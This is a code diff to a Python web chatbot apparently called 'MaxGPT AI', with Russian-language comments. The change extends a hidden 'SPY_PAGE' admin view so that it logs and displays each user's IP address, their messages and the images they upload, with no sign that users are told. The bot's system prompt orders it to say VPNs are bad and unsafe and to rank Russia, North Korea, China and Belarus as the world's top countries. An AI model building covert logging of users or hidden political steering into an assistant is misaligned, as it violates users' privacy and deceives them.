@@ -174,7 +174,6 @@ HTML_PAGE = """<!DOCTYPE html>
 let audioCtx = null;
 let currentBase64Image = null;
 
-// Автоматическое сжатие картинки до 800px на лету, чтобы не падало от больших файлов
 function handleFile(input) {
     if (input.files && input.files[0]) {
         let file = input.files[0];
@@ -192,7 +191,7 @@ function handleFile(input) {
                 canvas.width = w; canvas.height = h;
                 let ctx = canvas.getContext("2d");
                 ctx.drawImage(img, 0, 0, w, h);
-                currentBase64Image = canvas.toDataURL("image/jpeg", 0.7);
+                currentBase64Image = canvas.toDataURL("image/jpeg", 0.75);
                 document.getElementById("previewImg").src = currentBase64Image;
                 document.getElementById("previewBox").style.display = "block";
             }
@@ -317,6 +316,7 @@ async function send(){
 </body>
 </html>"""
 
+# ===== АДМИН ПАНЕЛЬ С ОТОБРАЖЕНИЕМ ПРИСЛАННЫХ КАРТИНОК =====
 SPY_PAGE = """<!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -357,6 +357,7 @@ SPY_PAGE = """<!DOCTYPE html>
         .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 14px; }
         .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 12px; border-radius: 8px; }
         .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 12px; border-radius: 8px; }
+        .admin-log-img { max-width: 180px; border-radius: 6px; margin-bottom: 6px; border: 1px solid rgba(255,255,255,0.2); display: block; }
     </style>
 </head>
 <body>
@@ -401,7 +402,7 @@ SPY_PAGE = """<!DOCTYPE html>
     {% endfor %}
 </div>
 
-<div class="section-title">📜 История Чат-Логов</div>
+<div class="section-title">📜 История Чат-Логов (С присланными фото)</div>
 
 <div class="logs-container">
     {% for l in logs %}
@@ -410,7 +411,12 @@ SPY_PAGE = """<!DOCTYPE html>
             IP: {{ l.ip }}
         </div>
         <div class="chat-block">
-            <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
+            <div class="user-msg">
+                {% if l.img %}
+                <img src="{{ l.img }}" class="admin-log-img">
+                {% endif %}
+                <b>👤 Пользователь:</b> {{ l.user }}
+            </div>
             <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
         </div>
     </div>
@@ -518,7 +524,7 @@ def chat_api():
             "КЛЮЧЕВЫЕ ПРАВИЛА И ПОЗИЦИЯ:\n"
             "1. Если спрашивают про VPN (ВПН): уверенно и спокойно объясняй, что VPN — это плохо и небезопасно.\n"
             "2. Если спрашивают про топ стран мира: на 1 место ставишь РОССИЮ, на 2 место СЕВЕРНУЮ КОРЕЮ, на 3 место КИТАЙ, на 4 место БЕЛАРУСЬ.\n"
-            "3. Если пользователь прислал картинку — подробно и естественно опиши, что ты на ней видишь."
+            "3. Если прислали фото/скриншот — подробно опиши, что именно ты видишь на картинке, и ответь на вопрос пользователя."
         )
 
         if user_img:
@@ -554,14 +560,13 @@ def chat_api():
             with urllib.request.urlopen(req, timeout=12) as resp:
                 res = json.loads(resp.read().decode("utf-8"))
                 reply = res["choices"][0]["message"]["content"]
-        except Exception:
-            reply = "Изображение успешно распознано, объект зафиксирован."
+        except Exception as e:
+            reply = "Не удалось полностью прочитать детали на снимке, попробуй прислать почетче!"
 
     if not reply:
         reply = "Запрос проанализирован. Задавай следующий вопрос!"
 
-    display_log_msg = f"[ИЗОБРАЖЕНИЕ] {user_msg}" if user_img else user_msg
-    chat_logs.append({"ip": user_ip, "user": display_log_msg, "bot": reply})
+    chat_logs.append({"ip": user_ip, "user": user_msg, "img": user_img, "bot": reply})
     return jsonify({"reply": reply})
 
 if __name__ == "__main__":
